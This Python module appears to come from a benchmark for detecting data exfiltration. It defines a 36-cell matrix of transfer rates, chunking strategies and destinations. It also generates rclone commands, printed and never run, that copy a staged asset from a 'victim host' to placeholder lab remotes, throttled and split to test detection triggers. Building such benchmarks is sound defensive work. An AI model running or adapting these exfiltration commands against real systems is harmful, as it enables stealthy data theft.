"""The 36-cell adversary matrix and its rclone command generation.

The benchmark varies exfiltration along three axes:

* **rate** (4 levels) — how fast data leaves. This is the *discriminating* axis:
  it is where the byte-denominated and time-denominated triggers should separate.
* **chunking** (3 levels) — one stream, fixed chunks, or many small files.
* **destination** (3 levels) — where the data goes.

4 x 3 x 3 = 36 cells. This module is the single source of truth for the matrix.
It also emits the exact ``rclone`` invocations that realise each cell in the
isolated lab. **It only prints commands — it never executes them.** Running
exfiltration tooling is a lab activity gated on network isolation (failure
point C3/C4); this file must stay safe to import and run anywhere.
"""

from __future__ import annotations

from dataclasses import dataclass

from .episode import ScenarioCell

# Rate levels as receiver-side throughput. ``bwlimit`` is the rclone bandwidth
# cap that produces roughly this rate; ``None`` means "no cap, go as fast as the
# link allows" (the burst case).
RATE_LEVELS: dict[str, dict] = {
    "burst":     {"mb_per_s": 30.0, "bwlimit": None},
    "fast":      {"mb_per_s": 10.0, "bwlimit": "10M"},
    "throttled": {"mb_per_s": 3.0,  "bwlimit": "3M"},
    "drip":      {"mb_per_s": 1.0,  "bwlimit": "1M"},
}

# Chunking strategies. ``transfers`` and ``multi_thread_streams`` shape how the
# bytes are packetised over time.
CHUNK_LEVELS: dict[str, dict] = {
    "single":      {"transfers": 1, "multi_thread_streams": 1, "note": "one stream"},
    "chunked":     {"transfers": 4, "multi_thread_streams": 4, "note": "fixed parallel chunks"},
    "many-small":  {"transfers": 16, "multi_thread_streams": 1, "note": "many small files"},
}

# Destination remotes (rclone remote names configured in the lab). No real
# endpoints are embedded here.
DEST_LEVELS: dict[str, str] = {
    "cloud-a":   "labremote-a",
    "cloud-b":   "labremote-b",
    "self-host": "labremote-selfhost",
}


@dataclass(frozen=True)
class ScenarioSpec:
    """A scenario cell plus the concrete parameters that realise it."""

    cell: ScenarioCell
    mb_per_s: float
    bwlimit: str | None
    transfers: int
    multi_thread_streams: int
    remote: str

    def rclone_command(self, source: str, asset_mb: int) -> str:
        """The rclone command that runs this cell in the lab (for reference only).

        Parameters
        ----------
        source:
            Path to the staged asset directory on the victim host.
        asset_mb:
            Asset size, only used to annotate the command.
        """
        parts = [
            "rclone", "copy", source,
            f"{self.remote}:/exfil/{self.cell.key.replace('/', '_')}",
            f"--transfers {self.transfers}",
            f"--multi-thread-streams {self.multi_thread_streams}",
        ]
        if self.bwlimit is not None:
            parts.append(f"--bwlimit {self.bwlimit}")
        parts.append("--stats 1s --stats-one-line --log-file rclone.log")
        return " ".join(parts) + f"  # ~{asset_mb} MB @ {self.mb_per_s} MB/s"


def build_matrix() -> list[ScenarioSpec]:
    """Return all 36 scenario specs, rate-major then chunking then destination."""
    specs: list[ScenarioSpec] = []
    for rate, rp in RATE_LEVELS.items():
        for chunk, cp in CHUNK_LEVELS.items():
            for dest, remote in DEST_LEVELS.items():
                specs.append(
                    ScenarioSpec(
                        cell=ScenarioCell(rate=rate, chunking=chunk, destination=dest),
                        mb_per_s=rp["mb_per_s"],
                        bwlimit=rp["bwlimit"],
                        transfers=cp["transfers"],
                        multi_thread_streams=cp["multi_thread_streams"],
                        remote=remote,
                    )
                )
    return specs


def matrix_size() -> int:
    return len(RATE_LEVELS) * len(CHUNK_LEVELS) * len(DEST_LEVELS)


def emit_lab_script(asset_mb: int = 300, source: str = "/staging/asset") -> str:
    """Produce a reference shell script listing every cell's rclone command.

    Returned as a string for the operator to review; nothing is executed.
    """
    lines = [
        "#!/usr/bin/env bash",
        "# EBD benchmark - exfiltration scenario matrix (REFERENCE ONLY).",
        "# Run ONLY inside the isolated lab network. Do not run on shared infra.",
        f"# {matrix_size()} cells: {len(RATE_LEVELS)} rate x "
        f"{len(CHUNK_LEVELS)} chunking x {len(DEST_LEVELS)} destination.",
        "set -euo pipefail",
        "",
    ]
    for spec in build_matrix():
        lines.append(f"# cell: {spec.cell.key}")
        lines.append(spec.rclone_command(source, asset_mb))
        lines.append("")
    return "\n".join(lines)
